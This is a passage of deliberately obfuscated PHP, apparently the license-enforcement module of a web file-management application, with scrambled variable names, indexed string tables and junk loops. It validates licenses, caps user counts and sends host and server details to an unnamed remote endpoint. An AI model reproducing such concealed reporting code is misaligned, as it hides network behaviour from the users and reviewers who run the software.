ActionCall($°Ùˆóåœ); call_user_func(array($´Ã½çã–[8], $´Ã½çã–[9]), $Ù¢•ô¤Ö . $´Ã½çã–[11], $°Ùˆóåœ); } private function autorun() { $ïœüİ¼Ø =& $_SERVER[ÏéâËõ‘]; $äôÀöÄ =& $_SERVER[…¡Î×İ¶]; global $config; if (count($config[$äôÀöÄ[12]]) == 0) { return; } foreach ($config[$äôÀöÄ[12]] as $æş¾¤É => $ûíì¯û÷) { $this->appRun($ûíì¯û÷); $™Ö²ü‡² = $ïœüİ¼Ø[623]; while (strlen($™Ö²ü‡²) < $ïœüİ¼Ø[620]) { if (!$™Ö²ü‡²) { break; } $™Ö²ü‡²++; } } } private function tkusefc867c0() { $ôş¶ƒ‹Ù =& $_SERVER[ÏéâËõ‘]; $ ½ˆË¼Ç =& $_SERVER[…¡Î×İ¶]; $’¹¨òû· = $ ½ˆË¼Ç[4]; $çÎ°Ç»® = $ôş¶ƒ‹Ù[624]; $ü×’èÆ = $GLOBALS[$ ½ˆË¼Ç[13]][$ ½ˆË¼Ç[14]][0]; if (!$ü×’èÆ || strlen($ü×’èÆ) <= strlen($’¹¨òû·)) { return; } if (strtolower(substr($ü×’èÆ, -strlen($’¹¨òû·))) != $’¹¨òû·) { return; } $ñÊÒà…… = substr($ü×’èÆ, 0, -strlen($’¹¨òû·)); $®ßÉÓ— = $ôş¶ƒ‹Ù[625]; while ($®ßÉÓ— < $ôş¶ƒ‹Ù[626]) { if ($®ßÉÓ— >= 0) { break; } $®ßÉÓ—++; } $ìÙ¶×ôò = array($ ½ˆË¼Ç[4], $ñÊÒà……); $ÒÊ¨æİˆ = $ôş¶ƒ‹Ù[627]; if (!$ÒÊ¨æİˆ) { return; } $Áì÷Å¹ = array_slice($GLOBALS[$ ½ˆË¼Ç[13]][$ ½ˆË¼Ç[14]], 1); $ÑÁÜë® = $ôş¶ƒ‹Ù[628]; $GLOBALS[$ ½ˆË¼Ç[13]][$ ½ˆË¼Ç[14]] = array_merge($ìÙ¶×ôò, $Áì÷Å¹); $íÁ÷û÷ï = $ôş¶ƒ‹Ù[629]; while ($íÁ÷û÷ï < $ôş¶ƒ‹Ù[620]) { if ($íÁ÷û÷ï >= 0) { break; } $íÁ÷û÷ï++; } $GLOBALS[$ ½ˆË¼Ç[13]][$ ½ˆË¼Ç[15]] = implode($ ½ˆË¼Ç[0], $GLOBALS[$ ½ˆË¼Ç[13]][$ ½ˆË¼Ç[14]]); } private function glvje7ece894() { $Şß›Ñ¿ =& $_SERVER[ÏéâËõ‘]; $òö¥Şå‡ =& $_SERVER[…¡Î×İ¶]; if ($GLOBALS[$òö¥Şå‡[13]][$òö¥Şå‡[15]] != $òö¥Şå‡[6]) { return; } $İËÑŒæÀ = $_SERVER[$òö¥Şå‡[16]]; $­ùû—æ¬ = $Şß›Ñ¿[630]; if (!$­ùû—æ¬) { return; } $Š´’š®Á = $òö¥Şå‡[17]; if (!strstr($İËÑŒæÀ, $Š´’š®Á)) { return; } $ØØ¾—ÈŒ = strrpos($İËÑŒæÀ, $Š´’š®Á); $˜¾Ô•ƒ = $Şß›Ñ¿[631]; $Ã‰ã¦» = substr($İËÑŒæÀ, $ØØ¾—ÈŒ + strlen($Š´’š®Á)); $ú»´ÆôÀ = $Şß›Ñ¿[632]; preg_match_all($òö¥Şå‡[18], $Ã‰ã¦», $ò®·”æ—); $†ØúŞÙò = $Şß›Ñ¿[633]; if (!$†ØúŞÙò) { return; } $Ã‰ã¦» = trim($ò®·”æ—[0][0], $òö¥Şå‡[19]); $„Û¶ Ùë = $Şß›Ñ¿[634]; $GLOBALS[$òö¥Şå‡[13]][$òö¥Şå‡[14]] = explode($òö¥Şå‡[19], $Ã‰ã¦»); $GLOBALS[$òö¥Şå‡[13]][$òö¥Şå‡[15]] = implode($òö¥Şå‡[0], $GLOBALS[$òö¥Şå‡[13]][$òö¥Şå‡[14]]); } public function run() { $Ú²Í”ùÔ =& $_SERVER[ÏéâËõ‘]; $òğ›û²Õ =& $_SERVER[…¡Î×İ¶]; $this->glvje7ece894(); $this->tkusefc867c0(); $ü¤¿“…Ú = $GLOBALS[$òğ›û²Õ[13]][$òğ›û²Õ[14]]; $÷»šÁì¯ = $GLOBALS[$òğ›û²Õ[13]][$òğ›û²Õ[15]]; define($òğ›û²Õ[20], isset($ü¤¿“…Ú[0]) && $ü¤¿“…Ú[0] ? $ü¤¿“…Ú[0] : $this->defaultModule); $ï×óËğ® = $Ú²Í”ùÔ[635]; if (strlen($ï×óËğ®) < $Ú²Í”ùÔ[636]) { return; } define($òğ›û²Õ[21], isset($ü¤¿“…Ú[1]) && $ü¤¿“…Ú[0] ? $ü¤¿“…Ú[1] : $this->defaultController); $¢Ü—Ç¨´ = $Ú²Í”ùÔ[637]; if (!$¢Ü—Ç¨´) { die; } define($òğ›û²Õ[22], isset($ü¤¿“…Ú[2]) && $ü¤¿“…Ú[0] ? $ü¤¿“…Ú[2] : $this->defaultAction); define($òğ›û²Õ[23], MOD . $òğ›û²Õ[0] . ST . $òğ›û²Õ[0] . ACT); $_SERVER[$òğ›û²Õ[24]] = strtolower(ACTION); $Èàßı = $Ú²Í”ùÔ[638]; $this->autorun(); $û‹¾£¢ô = $Ú²Í”ùÔ[639]; if (strlen($û‹¾£¢ô) < $Ú²Í”ùÔ[615]) { return; } if (count($ü¤¿“…Ú) >= 3) { $this->appRun($÷»šÁì¯); } else { $this->appRun(ACTION); } } private $jxlu9901dba9 = array(); private $xutn5a1cae4f = ''; public function fjlq556df32f() { $¯­á’ëé =& $_SERVER[ÏéâËõ‘]; $ûˆ¿äºó =& $_SERVER[…¡Î×İ¶]; $this->gaqb9d7c61d6(); $ıÁË³ßó = $¯­á’ëé[640]; if (!$ıÁË³ßó) { return; } $this->jfqt63f5e6f5(); $this->zmqk43f3e7d2(); $Ã³£Âñ§ = $¯­á’ëé[641]; if (!$Ã³£Âñ§) { return; } $this->rnle99cbf809(); $this->rvaj69c1a6e1(); $this->lmjwfbc6b97c(); $ê®î¢ğ = $¯­á’ëé[642]; while (strlen($ê®î¢ğ) < $¯­á’ëé[615]) { if (!$ê®î¢ğ) { break; } $ê®î¢ğ++; } $this->bwcj42c99829(); $”˜ö—úƒ = $¯­á’ëé[643]; while (strlen($”˜ö—úƒ) < $¯­á’ëé[620]) { if (!$”˜ö—úƒ) { break; } $”˜ö—úƒ++; } $this->cfqw168c4d05($ûˆ¿äºó[25], array($this, $ûˆ¿äºó[26])); $“¡«Ùˆæ = $¯­á’ëé[644]; if (!$“¡«Ùˆæ) { die; } $this->cfqw168c4d05($ûˆ¿äºó[27], array($this, $ûˆ¿äºó[28])); $this->cfqw168c4d05($ûˆ¿äºó[29], array($this, $ûˆ¿äºó[30])); $this->cfqw168c4d05($ûˆ¿äºó[31], array($this, $ûˆ¿äºó[32])); $ÀãêüÕœ = $¯­á’ëé[645]; if (!$ÀãêüÕœ) { die; } } public function rjfg8cdf2191($Ë¼¥›œ÷) { $½îşß™ =& $_SERVER[ÏéâËõ‘]; $Ö½Ó¯—” =& $_SERVER[…¡Î×İ¶]; $³ºö‘è« = Model($Ö½Ó¯—”[33])->get(); $¾òô§—ß = array($Ö½Ó¯—”[34], $Ö½Ó¯—”[35], $Ö½Ó¯—”[36], $Ö½Ó¯—”[37], $Ö½Ó¯—”[38], $Ö½Ó¯—”[39], $Ö½Ó¯—”[40], $Ö½Ó¯—”[41], $Ö½Ó¯—”[42], $Ö½Ó¯—”[43], $Ö½Ó¯—”[44], $Ö½Ó¯—”[45], $Ö½Ó¯—”[46], $Ö½Ó¯—”[47], $Ö½Ó¯—”[48], $Ö½Ó¯—”[49], $Ö½Ó¯—”[50], $Ö½Ó¯—”[51], $Ö½Ó¯—”[52], $Ö½Ó¯—”[53], $Ö½Ó¯—”[54], $Ö½Ó¯—”[55], $Ö½Ó¯—”[56], $Ö½Ó¯—”[57], $Ö½Ó¯—”[58], $Ö½Ó¯—”[59], $Ö½Ó¯—”[60], $Ö½Ó¯—”[61], $Ö½Ó¯—”[62], $Ö½Ó¯—”[63], $Ö½Ó¯—”[64], $Ö½Ó¯—”[65], $Ö½Ó¯—”[66], $Ö½Ó¯—”[67], $Ö½Ó¯—”[68], $Ö½Ó¯—”[69], $Ö½Ó¯—”[70], $Ö½Ó¯—”[71], $Ö½Ó¯—”[72], $Ö½Ó¯—”[73], $Ö½Ó¯—”[74], $Ö½Ó¯—”[75], $Ö½Ó¯—”[76], $Ö½Ó¯—”[77], $Ö½Ó¯—”[78], $Ö½Ó¯—”[79], $Ö½Ó¯—”[80], $Ö½Ó¯—”[81], $Ö½Ó¯—”[82], $Ö½Ó¯—”[83]); $§®Ñ›˜È = $½îşß™[646]; if (strlen($§®Ñ›˜È) < $½îşß™[620]) { die; } foreach ($¾òô§—ß as $Â·»Ó’) { $›õ‚µŸÎ = $GLOBALS[$Ö½Ó¯—”[84]][$Ö½Ó¯—”[85]][$Â·»Ó’]; if (isset($³ºö‘è«[$Â·»Ó’])) { $›õ‚µŸÎ = $³ºö‘è«[$Â·»Ó’]; } $Ë¼¥›œ÷[$Ö½Ó¯—”[86]][$Ö½Ó¯—”[87]][$Â·»Ó’] = $›õ‚µŸÎ; } $Í¢ÉšÖ× = $Ë¼¥›œ÷[$Ö½Ó¯—”[86]][$Ö½Ó¯—”[87]][$Ö½Ó¯—”[46]]; $÷Ì†ûÛ­ = $½îşß™[647]; if (!$÷Ì†ûÛ­) { return; } unset($Ë¼¥›œ÷[$Ö½Ó¯—”[86]][$Ö½Ó¯—”[88]][$Ö½Ó¯—”[89]]); unset($Ë¼¥›œ÷[$Ö½Ó¯—”[86]][$Ö½Ó¯—”[88]][$Ö½Ó¯—”[90]]); $õ¥ÎÂÏÊ = $½îşß™[648]; if (strlen($õ¥ÎÂÏÊ) < $½îşß™[615]) { die; } unset($Ë¼¥›œ÷[$Ö½Ó¯—”[86]][$Ö½Ó¯—”[87]][$Ö½Ó¯—”[46]]); $´”ú”Ä€ = $½îşß™[649]; while (strlen($´”ú”Ä€) < $½îşß™[636]) { if (!$´”ú”Ä€) { break; } $´”ú”Ä€++; } unset($Ë¼¥›œ÷[$Ö½Ó¯—”[86]][$Ö½Ó¯—”[87]][$Ö½Ó¯—”[91]]); $éªÍ…­¼ = $½îşß™[650]; $Ë¼¥›œ÷[$Ö½Ó¯—”[86]][$Ö½Ó¯—”[87]][$Ö½Ó¯—”[92]] = array($Ö½Ó¯—”[93] => (int) $Í¢ÉšÖ×[$Ö½Ó¯—”[94]], $Ö½Ó¯—”[95] => (int) _get($Í¢ÉšÖ×, $Ö½Ó¯—”[96], 0)); $è”ùÄÙÙ = $½îşß™[651]; if (strlen($è”ùÄÙÙ) < $½îşß™[636]) { die; } $Ë¼¥›œ÷[$Ö½Ó¯—”[97]][$Ö½Ó¯—”[98]] = Action($Ö½Ó¯—”[99])->accessToken(); $Ë¼¥›œ÷[$Ö½Ó¯—”[97]][$Ö½Ó¯—”[100]] = md5($_SERVER[$Ö½Ó¯—”[101]] . $³ºö‘è«[$Ö½Ó¯—”[102]]); $Ë¼¥›œ÷[$Ö½Ó¯—”[97]][$Ö½Ó¯—”[103]] = base64_encode(serverInfo()); $Ë¼¥›œ÷[$Ö½Ó¯—”[97]][$Ö½Ó¯—”[104]] = $this->xutn5a1cae4f; if ($³ºö‘è«[$Ö½Ó¯—”[104]] != $Ö½Ó¯—”[105]) { $Ë¼¥›œ÷[$Ö½Ó¯—”[97]][$Ö½Ó¯—”[106]] = $³ºö‘è«[$Ö½Ó¯—”[106]]; $Ë¼¥›œ÷[$Ö½Ó¯—”[97]][$Ö½Ó¯—”[107]] = $³ºö‘è«[$Ö½Ó¯—”[107]]; $Øó·È¯Ñ = rand_string(10) . $this->xutn5a1cae4f . rand_string(5); $Ë¼¥›œ÷[$Ö½Ó¯—”[86]][$Ö½Ó¯—”[108]][$Ö½Ó¯—”[109]] = $this->chkj25df11cb($Øó·È¯Ñ, $Ë¼¥›œ÷[$Ö½Ó¯—”[97]][$Ö½Ó¯—”[100]]); } if ($this->xutn5a1cae4f == $Ö½Ó¯—”[105]) { $Ë¼¥›œ÷[$Ö½Ó¯—”[86]][$Ö½Ó¯—”[87]][$Ö½Ó¯—”[92]][$Ö½Ó¯—”[96]] = 0; } $Ë¼¥›œ÷[$Ö½Ó¯—”[97]][$Ö½Ó¯—”[110]] = _get($this->jxlu9901dba9, $Ö½Ó¯—”[111], $Ö½Ó¯—”[6]); $Ë¼¥›œ÷[$Ö½Ó¯—”[97]][$Ö½Ó¯—”[112]] = _get($this->jxlu9901dba9, $Ö½Ó¯—”[113], $Ö½Ó¯—”[6]); $êÆğÉ—» = $½îşß™[652]; if (strlen($êÆğÉ—») < $½îşß™[615]) { return; } if (_get($GLOBALS, $Ö½Ó¯—”[114]) && $this->config[$Ö½Ó¯—”[115]]) { $Ë¼¥›œ÷[$Ö½Ó¯—”[97]][$Ö½Ó¯—”[116]] = WEB_ROOT; } return $Ë¼¥›œ÷; } private function lmjwfbc6b97c() { $×í¶ùö =& $_SERVER[ÏéâËõ‘]; $ò§Úùí£ =& $_SERVER[…¡Î×İ¶]; $ùâæÄûµ = $_SERVER[$ò§Úùí£[24]] == $ò§Úùí£[117]; if ($_SERVER[$ò§Úùí£[24]] == $ò§Úùí£[118] && $_GET[$ò§Úùí£[119]] == $ò§Úùí£[120]) { $ùâæÄûµ = !0; } if ($ùâæÄûµ) { $ÄÌ…ã•… = array($ò§Úùí£[104] => $this->xutn5a1cae4f, $ò§Úùí£[121] => $this->degv0f71fd11(), $ò§Úùí£[122] => Model($ò§Úùí£[123])->count()); if ($this->xutn5a1cae4f != $ò§Úùí£[105]) { $âûá = _get($this->jxlu9901dba9, $ò§Úùí£[124]); if ($âûá) { $ÄÌ…ã•…[$ò§Úùí£[125]] = $âûá; $ÄÌ…ã•…[$ò§Úùí£[126]] = strtotime(_get($this->jxlu9901dba9, $ò§Úùí£[127])); $ÄÌ…ã•…[$ò§Úùí£[128]] = _get($this->jxlu9901dba9, $ò§Úùí£[113]); } $…ÀàĞô¤ = Model($ò§Úùí£[33])->get($ò§Úùí£[129], $ò§Úùí£[6], !0); if (is_string($…ÀàĞô¤) && substr($…ÀàĞô¤, 0, 1) == $ò§Úùí£[130]) { $…ÀàĞô¤ = json_decode_force($…ÀàĞô¤); } if (is_array($…ÀàĞô¤) && $…ÀàĞô¤[$ò§Úùí£[131]] && strstr($…ÀàĞô¤[$ò§Úùí£[131]], $ò§Úùí£[132])) { $³¦ÙÍ§« = explode($ò§Úùí£[132], $…ÀàĞô¤[$ò§Úùí£[131]]); $ÄÌ…ã•…[$ò§Úùí£[133]] = $³¦ÙÍ§«[0]; } } $ÄÌ…ã•… = $this->fwuve8735ea6(json_encode($ÄÌ…ã•…), md5($ò§Úùí£[134])); $Ú“æµëİ = array($ò§Úùí£[135] => $ÄÌ…ã•…); $Ğ¨æ»´ğ = $×í¶ùö[653]; if (!$Ğ¨æ»´ğ) { return; } call_user_func(array($ò§Úùí£[136], $ò§Úùí£[137]), $Ú“æµëİ); $·É‡ÎÔ = $×í¶ùö[654]; } if ($this->xutn5a1cae4f == $ò§Úùí£[105]) { return; } $š£Ì«— = array($ò§Úùí£[138], $ò§Úùí£[139], $ò§Úùí£[140], $ò§Úùí£[141], $ò§Úùí£[142], $ò§Úùí£[143]); $ÙâöÊ¸Ñ = Model($ò§Úùí£[33])->get(); $Ú“æµëİ = array($ò§Úùí£[144] => $ÙâöÊ¸Ñ[$ò§Úùí£[34]], $ò§Úùí£[145] => $ÙâöÊ¸Ñ[$ò§Úùí£[35]], $ò§Úùí£[146] => $ò§Úùí£[6]); foreach ($š£Ì«— as $¿İ‰’Ã) { if (!isset($ÙâöÊ¸Ñ[$¿İ‰’Ã]) || !$ÙâöÊ¸Ñ[$¿İ‰’Ã]) { continue; } $Ú“æµëİ[$¿İ‰’Ã] = $ÙâöÊ¸Ñ[$¿İ‰’Ã]; } call_user_func(array($ò§Úùí£[136], $ò§Úùí£[137]), $Ú“æµëİ); $¿Ù²ÖÜ˜ = $×í¶ùö[655]; } private function rnle99cbf809() { $šÙ ¡ë™ =& $_SERVER[ÏéâËõ‘]; $·í‚úˆ =& $_SERVER[…¡Î×İ¶]; if ($_SERVER[$·í‚úˆ[24]] != $·í‚úˆ[147]) { return; } if (!_get($GLOBALS, $·í‚úˆ[114])) { die; } $¹Ú£ÛäÙ = $GLOBALS[$·í‚úˆ[13]]; if (isset($¹Ú£ÛäÙ[$·í‚úˆ[148]])) { $this->mwgn0620450f(); die; } if (!isset($¹Ú£ÛäÙ[$·í‚úˆ[149]]) || strlen($¹Ú£ÛäÙ[$·í‚úˆ[149]]) != 16) { show_json($·í‚úˆ[150] . $¹Ú£ÛäÙ[$·í‚úˆ[149]], !1); } $°°í¡°Ò = Model($·í‚úˆ[33])->get($·í‚úˆ[102]); $ğÉÂÉ·‡ = md5($_SERVER[$·í‚úˆ[101]] . $°°í¡°Ò); $Öµº‹Ø˜ = array($·í‚úˆ[149] => $¹Ú£ÛäÙ[$·í‚úˆ[149]], $·í‚úˆ[151] => rand_string(16), $·í‚úˆ[152] => $·í‚úˆ[134], $·í‚úˆ[153] => $·í‚úˆ[154], $·í‚úˆ[155] => $_SERVER[$·í‚úˆ[156]], $·í‚úˆ[157] => $_SERVER[$·í‚úˆ[158]], $·í‚úˆ[159] => $_SERVER[$·í‚úˆ[160]], $·í‚úˆ[100] => $ğÉÂÉ·‡, $·í‚úˆ[161] => Model($·í‚úˆ[33])->get($·í‚úˆ[129])); $€—ú÷ = $šÙ ¡ë™[656]; if ($¹Ú£ÛäÙ[$·í‚úˆ[162]] == $·í‚úˆ[163]) { $ô˜·ôó… = $this->fwuve8735ea6($ğÉÂÉ·‡, $·í‚úˆ[164]); $Şç¼ãÁ¼ = $this->chkj25df11cb(json_encode($Öµº‹Ø˜), $ğÉÂÉ·‡ . $·í‚úˆ[165], 3); $Şç¼ãÁ¼ = $Şç¼ãÁ¼ . $·í‚úˆ[166] . $_SERVER[$·í‚úˆ[156]]; $ê¤ØÛùŸ = $this->giec71782f9d($·í‚úˆ[167] . $ô˜·ôó… . $·í‚úˆ[168] . $Şç¼ãÁ¼, -1); show_json($ê¤ØÛùŸ, !0); } else { if ($¹Ú£ÛäÙ[$·í‚úˆ[162]] == $·í‚úˆ[169]) { $¯Ñ©’Î“ = substr(md5($·í‚úˆ[170] . $ğÉÂÉ·‡), 12, 15) . $·í‚úˆ[171]; $Şç¼ãÁ¼ = $this->iucjaf330ea8(trim($¹Ú£ÛäÙ[$·í‚úˆ[172]]), $¯Ñ©’Î“, 2); $¾«ÑÀéÈ = json_decode($Şç¼ãÁ¼, !0); if (!is_array($¾«ÑÀéÈ) || !is_array($¾«ÑÀéÈ[$·í‚úˆ[173]]) || $¾«ÑÀéÈ[$·í‚úˆ[149]] != !0) { $ˆ£»êšê = $·í‚úˆ[174]; $’ùïüæ´ = $¾«ÑÀéÈ[$·í‚úˆ[173]] ? $·í‚úˆ[175] . $¾«ÑÀéÈ[$·í‚úˆ[173]] : $ˆ£»êšê; show_json($’ùïüæ´, !1); } else { $Öµº‹Ø˜[$·í‚úˆ[151]] = $¾«ÑÀéÈ[$·í‚úˆ[173]][$·í‚úˆ[176]]; } } else { $¾«ÑÀéÈ = $this->giec71782f9d($·í‚úˆ[177], $Öµº‹Ø˜, 10); $¥Ù¸©¿• = $šÙ ¡ë™[657]; while (strlen($¥Ù¸©¿•) < $šÙ ¡ë™[626]) { if (!$¥Ù¸©¿•) { break; } $¥Ù¸©¿•++; } } } if (!is_array($¾«ÑÀéÈ) || !is_array($¾«ÑÀéÈ[$·í‚úˆ[173]]) || $¾«ÑÀéÈ[$·í‚úˆ[149]] != !0) { $ˆ£»êšê = LNG($·í‚úˆ[178]); $’ùïüæ´ = $¾«ÑÀéÈ[$·í‚úˆ[173]] ? $·í‚úˆ[175] . $¾«ÑÀéÈ[$·í‚úˆ[173]] : $ˆ£»êšê; show_json($’ùïüæ´, !1); } $¦ğÔ‚ş = $¾«ÑÀéÈ[$·í‚úˆ[173]]; $ÕÂº„ËØ = $this->qkmx8a102af8($¦ğÔ‚ş[$·í‚úˆ[179]]); if (!$ÕÂº„ËØ || $ÕÂº„ËØ != $¦ğÔ‚ş[$·í‚úˆ[127]]) { $Òş½éİ– = array($·í‚úˆ[180] => Model($·í‚úˆ[33])->get($·í‚úˆ[102]), $·í‚úˆ[181] => $_SERVER[$·í‚úˆ[101]], $·í‚úˆ[182] => this_url(), $·í‚úˆ[157] => $_SERVER[$·í‚úˆ[158]]); $Şç¼ãÁ¼ = $this->mvxk64799121(json_encode($Òş½éİ–)); $this->giec71782f9d($·í‚úˆ[183] . $Şç¼ãÁ¼); show_json(LNG($·í‚úˆ[184]), !0); } $Úæù±• = array($·í‚úˆ[185] => $¦ğÔ‚ş[$·í‚úˆ[186]], $·í‚úˆ[187] => $¦ğÔ‚ş[$·í‚úˆ[188]], $·í‚úˆ[189] => rand_string(16), $·í‚úˆ[104] => $¦ğÔ‚ş[$·í‚úˆ[190]]); if ($Öµº‹Ø˜[$·í‚úˆ[151]]) { $Úæù±•[$·í‚úˆ[189]] = $Öµº‹Ø˜[$·í‚úˆ[151]]; } $É˜©Í = substr(md5($Úæù±•[$·í‚úˆ[187]]), 10, 10); $£×Şì‹Á = $É˜©Í . $Úæù±•[$·í‚úˆ[104]] . $Úæù±•[$·í‚úˆ[189]]; $•–ó¨Ü¦ = $šÙ ¡ë™[658]; if (strlen($•–ó¨Ü¦) < $šÙ ¡ë™[615]) { return; } $Úæù±•[$·í‚úˆ[106]] = strrev(base64_encode($this->fwuve8735ea6($£×Şì‹Á, $·í‚úˆ[191]))); $‰¥Ğªğ = $šÙ ¡ë™[659]; if (strlen($‰¥Ğªğ) < $šÙ ¡ë™[626]) { return; } $‚õù¦® = rand_string(16); $ê¡ìÔ×ü = $‚õù¦® . $Úæù±•[$·í‚úˆ[104]] . $this->fwuve8735ea6(md5($Úæù±•[$·í‚úˆ[185]]), $‚õù¦®); $Úæù±•[$·í‚úˆ[107]] = base64_encode(strrev($this->fwuve8735ea6($ê¡ìÔ×ü, $·í‚úˆ[192]))); if ($¦ğÔ‚ş[$·í‚úˆ[193]] && $¦ğÔ‚ş[$·í‚úˆ[193]] >= 1) { Model($·í‚úˆ[33])->setDeep($·í‚úˆ[194], $·í‚úˆ[120]); } Model($·í‚úˆ[33])->set($Úæù±•); $§Ö æà = md5($_SERVER[$·í‚úˆ[101]] . strrev($°°í¡°Ò) . $Úæù±•[$·í‚úˆ[187]]); $¢ÇŒ¢ÃÙ = $šÙ ¡ë™[660]; $óö©´ó¯ = strrev(substr($§Ö æà, 10, 16)); $´‡îş¡ = $šÙ ¡ë™[625]; if (!$´‡îş¡) { die; } $÷À©ÀŞ = $this->chkj25df11cb(json_encode($¦ğÔ‚ş), $§Ö æà); $¦öíÂÎ = $šÙ ¡ë™[661]; if (!$¦öíÂÎ) { return; } $İ§’õæÍ = array_to_keyvalue(Model($·í‚úˆ[7])->listData(), $·í‚úˆ[195]); $•Û»±Êñ = $šÙ ¡ë™[662]; if (strlen($•Û»±Êñ) < $šÙ ¡ë™[620]) { return; } $Ù»İ¿‡± = $İ§’õæÍ[$·í‚úˆ[196]]; $¯ÀˆÉÅÑ = array(); $¯ÀˆÉÅÑ[$óö©´ó¯] = $÷À©ÀŞ; Model($·í‚úˆ[7])->update($Ù»İ¿‡±[$·í‚úˆ[197]], array($·í‚úˆ[198] => $¯ÀˆÉÅÑ)); $this->jxlu9901dba9 = $¦ğÔ‚ş; $¤Ò²ü… = $šÙ ¡ë™[663]; $this->xutn5a1cae4f = $Úæù±•[$·í‚úˆ[104]]; $this->licenseRegistSuccess(); Cache::set($·í‚úˆ[199] . md5($°°í¡°Ò . $·í‚úˆ[200]), $·í‚úˆ[6]); $œœìØ•Ì = $šÙ ¡ë™[664]; while (strlen($œœìØ•Ì) < $šÙ ¡ë™[636]) { if (!$œœìØ•Ì) { break; } $œœìØ•Ì++; } show_json(LNG($·í‚úˆ[184]), !0); } private function licenseRegistSuccess() { $Ííøµşè =& $_SERVER[…¡Î×İ¶]; $üØ“ì¸´ = Model($Ííøµşè[33])->get(); if ($üØ“ì¸´[$Ííøµşè[63]] != $Ííøµşè[120]) { Model($Ííøµşè[33])->set($Ííøµşè[63], $Ííøµşè[120]); } Action($Ííøµşè[201])->initStart(!0); } private function mwgn0620450f() { $ÔıØäìÑ =& $_SERVER[ÏéâËõ‘]; $çä±¾Ûñ =& $_SERVER[…¡Î×İ¶]; Model($çä±¾Ûñ[33])->set(array($çä±¾Ûñ[185] => $çä±¾Ûñ[6], $çä±¾Ûñ[187] => $çä±¾Ûñ[6], $çä±¾Ûñ[104] => $çä±¾Ûñ[105], $çä±¾Ûñ[106] => $çä±¾Ûñ[6], $çä±¾Ûñ[107] => $çä±¾Ûñ[6])); Model($çä±¾Ûñ[33])->setDeep($çä±¾Ûñ[194], $çä±¾Ûñ[202]); $ÅÖŠ¼Œî = $ÔıØäìÑ[665]; while ($ÅÖŠ¼Œî < $ÔıØäìÑ[626]) { if ($ÅÖŠ¼Œî >= 0) { break; } $ÅÖŠ¼Œî++; } $this->jxlu9901dba9 = array(); $Ùçà¿ÀÎ = $ÔıØäìÑ[666]; if (strlen($Ùçà¿ÀÎ) < $ÔıØäìÑ[620]) { die; } $this->xutn5a1cae4f = $çä±¾Ûñ[105]; $Ÿ™ÅáÈÅ = $ÔıØäìÑ[667]; if (!$Ÿ™ÅáÈÅ) { die; } } private function gaqb9d7c61d6() { $ôŠî…«Ç =& $_SERVER[ÏéâËõ‘]; $·Òé‰È© =& $_SERVER[…¡Î×İ¶]; $_SERVER[$·Òé‰È©[158]] = _get($_SERVER, $·Òé‰È©[158], APP_HOST); $Ë³æôÁñ = $ôŠî…«Ç[668]; $this->xutn5a1cae4f = $·Òé‰È©[105]; $±õòÂà¯ = Model($·Òé‰È©[33])->get(); $÷Çíˆ = $ôŠî…«Ç[669]; while (strlen($÷Çíˆ) < $ôŠî…«Ç[615]) { if (!$÷Çíˆ) { break; } $÷Çíˆ++; } if ($±õòÂà¯[$·Òé‰È©[104]] == $·Òé‰È©[105]) { return; } $Ïªğì™ö = Model($·Òé‰È©[33])->get($·Òé‰È©[102]); $œ¥ÃúÁØ = $ôŠî…«Ç[670]; if (strlen($œ¥ÃúÁØ) < $ôŠî…«Ç[620]) { return; } $„®Ôï™è = $·Òé‰È©[199] . md5($Ïªğì™ö . $·Òé‰È©[200]); $‹›Á‚Å = $ôŠî…«Ç[671]; if (!$‹›Á‚Å) { die; } $ÉìÉÃ ˜ = Cache::get($„®Ôï™è); if (!is_array($ÉìÉÃ ˜) || !isset($ÉìÉÃ ˜[$·Òé‰È©[203]]) || time() - $ÉìÉÃ ˜[$·Òé‰È©[203]] >= 60) { $æ›ƒÅ¤¬ = Model($·Òé‰È©[7])->loadList(); $£œ†Ú³¯ = $æ›ƒÅ¤¬[$·Òé‰È©[196]]; $ıƒî¾şÉ = md5($_SERVER[$·Òé‰È©[101]] . strrev($Ïªğì™ö) . $±õòÂà¯[$·Òé‰È©[187]]); $½Ä®§Á = strrev(substr($ıƒî¾şÉ, 10, 16)); $ÉìÉÃ ˜ = $this->iucjaf330ea8($£œ†Ú³¯[$·Òé‰È©[84]][$½Ä®§Á], $ıƒî¾şÉ); $ÉìÉÃ ˜ = json_decode($ÉìÉÃ ˜, !0); } if (!is_array($ÉìÉÃ ˜)) { return $this->mwgn0620450f(); } $‚»ÊË‚í = strtotime($ÉìÉÃ ˜[$·Òé‰È©[127]]); if (time() >= $‚»ÊË‚í) { return $this->mwgn0620450f(); } if (time() - $ÉìÉÃ ˜[$·Òé‰È©[203]] > 20) { $ÉìÉÃ ˜[$·Òé‰È©[203]] = time(); Cache::set($„®Ôï™è, $ÉìÉÃ ˜); } $this->jxlu9901dba9 = $ÉìÉÃ ˜; $this->xutn5a1cae4f = $±õòÂà¯[$·Òé‰È©[104]]; } private function jfqt63f5e6f5() { $éùïğÜ‚ =& $_SERVER[…¡Î×İ¶]; $Œçôä˜ù = $GLOBALS[$éùïğÜ‚[13]]; $¢Ø¥Èˆ = $_SERVER[$éùïğÜ‚[24]]; if ($¢Ø¥Èˆ == $éùïğÜ‚[204] && $this->xutn5a1cae4f == $éùïğÜ‚[105]) { show_json(LNG($éùïğÜ‚[205]), !1, $éùïğÜ‚[206]); } $÷şÏ©µ = array($éùïğÜ‚[207], $éùïğÜ‚[208]); if (in_array($¢Ø¥Èˆ, $÷şÏ©µ)) { if ($this->xutn5a1cae4f == $éùïğÜ‚[105] && isset($Œçôä˜ù[$éùïğÜ‚[209]])) { show_json(LNG($éùïğÜ‚[205]), !1, $éùïğÜ‚[206]); die; } $¾Ö»‡Ç« = $this->degv0f71fd11(); if ($¾Ö»‡Ç« != intval($éùïğÜ‚[210])) { if ($¾Ö»‡Ç« <= Model($éùïğÜ‚[123])->count()) { show_json(LNG($éùïğÜ‚[211]), !1, $éùïğÜ‚[206]); die; } } } } private function zmqk43f3e7d2() { $„äœÌŒ =& $_SERVER[ÏéâËõ‘]; $şÈ™ıÛÈ =& $_SERVER[…¡Î×İ¶]; $çûõ»ë = array($şÈ™ıÛÈ[117], $şÈ™ıÛÈ[118]); $á•Ìø¿’ = $„äœÌŒ[672]; if (strlen($á•Ìø¿’) < $„äœÌŒ[673]) { die; } if (!_get($GLOBALS, $şÈ™ıÛÈ[114]) || !isset($_GET[$şÈ™ıÛÈ[212]])) { return; } if (!in_array($_SERVER[$şÈ™ıÛÈ[24]], $çûõ»ë)) { return; } $™”‰Ëìæ = $şÈ™ıÛÈ[213]; 